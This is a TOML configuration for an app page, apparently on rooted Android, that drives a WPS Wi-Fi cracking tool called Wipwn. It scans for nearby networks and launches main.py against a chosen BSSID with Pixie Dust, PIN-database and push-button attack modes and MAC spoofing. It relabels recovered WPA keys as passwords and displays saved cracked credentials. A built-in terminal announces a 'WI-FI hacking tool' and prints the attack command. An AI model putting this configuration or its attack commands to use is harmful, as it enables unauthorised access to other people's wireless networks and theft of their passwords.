[[toml]]
load-key-sh = "ETC=$PAGE_CONFIG_DIR langpath"
load-toml-sh = "menuadd $PAGE_CONFIG_DIR"

[[fab]]
[[fab.items]]
type = "refresh"
fab-spin = true
icon = "{ICON}/Loading.png"

[[group]]
title-sh = """
[ -f $PAGE_CONFIG_DIR/lang/auto.bash ] && echo "@google_text"
"""
[[text.rows]]
color = "#0dbda2"
copy = true
text-sh = """
if [ "$(cmd wifi status | grep -cm1 "Wifi is disabled")" == 1 ]; then
cmd wifi set-wifi-enabled enabled
sleep 1
fi
iw dev wlan0 link
"""

[[group]]
[[download]]
title = "@latest_update_text"
auto-finish = true
load-after = true
icon = "icon.png"
support = "add_check $PAGE_CONFIG_DIR"
url-sh = "cat $PAGE_CONFIG_DIR/update"
script = "installadd $state ${PAGE_CONFIG_DIR%/*}"

[[group]]
[[picker]]
title = "@wifi_text_1"
desc = "@wifi_text_2"
reload = true
option-sh = "python $PAGE_CONFIG_DIR/scan_wifi.py"
set = """
if [ "$state" ]; then
echo "@wifi_text_3..."
echo
[ -d $HOME/.Wipwn ] && rm -fr $HOME/.Wipwn
[ -e /dev/wmtWifi ] && wifi_tool_mtk="--mtk-wifi"
cd "$HOME/root"
if [ "$(glog wifi_tool_customize)" == 1 ]; then
  python -u $PAGE_CONFIG_DIR/main.py -i wlan0 -b "$state" -B -w -p $(glog pin_number_wifi 00000000) --spoof-mac $wifi_tool_mtk | sed -u -e "s|WPA PSK:|WPA PSK (Password):|"
elif [ "$(glog wifi_tool_customize)" == 2 ]; then
  python -u $PAGE_CONFIG_DIR/main.py -i wlan0 -b "$state" --pbc $wifi_tool_mtk | sed -u -e "s|WPA PSK:|WPA PSK (Password):|"
else
  python -u $PAGE_CONFIG_DIR/main.py -i wlan0 -b "$state" -K --spoof-mac -d 3 -l 120 $wifi_tool_mtk | sed -u -e "s|WPA PSK:|WPA PSK (Password):|"
fi
echo
checktime
else
echo "@wifi_text_4"
fi
"""

[[group]]
[[terminal]]
title = "Terminal"
cwd = "{PAGE_CONFIG_DIR}"
root = true
cmd = '''
echo "WI-FI hacking tool

Basic commands:

# Attack
python main.py -i wlan0 -K

# See help
python main.py --help
"
'''
font-size = 14
exit-on-back = true

[[group]]
[[action]]
title = "@STR_ADVANCED_CUSTOM"
reload = true
shell = "hidden"
script = 'slog wifi_tool_customize $wifi_tool_customize"'

[[action.params]]
name = "wifi_tool_customize"
label = "@STR_OPTION"
desc = "@STR_ALL_ATTACK_METHODS"
value-sh = "glog wifi_tool_customize 0"

[[action.params.options]]
val = "0"
title = "@STR_BASIC_ATTACK"

[[action.params.options]]
val = "1"
title = "@STR_PIN_DATABASE_ATTACK"

[[action.params.options]]
val = "2"
title = "@STR_WPS_PUSH_ATTACK"

[[action]]
title = "@STR_INPUT_PIN"
summary-sh = "glog pin_number_wifi"
warn = "@STR_PIN_WARNING"
shell = "hidden"
support = '[ "$(glog wifi_tool_customize)" == 1 ] && echo 1'
script = 'slog pin_number_wifi $pin_number_wifi'

[[action.params]]
name = "pin_number_wifi"
label = "@STR_PIN_CODE"
placeholder = "12345670"
type = "number"
value-sh = "glog pin_number_wifi"

[[group]]
[[action]]
title = "@wifi_text_5"
script = """
if [ -f $HOME/root/store/wipwn_crack_data.txt ]; then
  cat $HOME/root/store/wipwn_crack_data.txt | sed "s|PSK:|PSK (Password):|g"
else
  echo "@wifi_text_6"
fi
"""
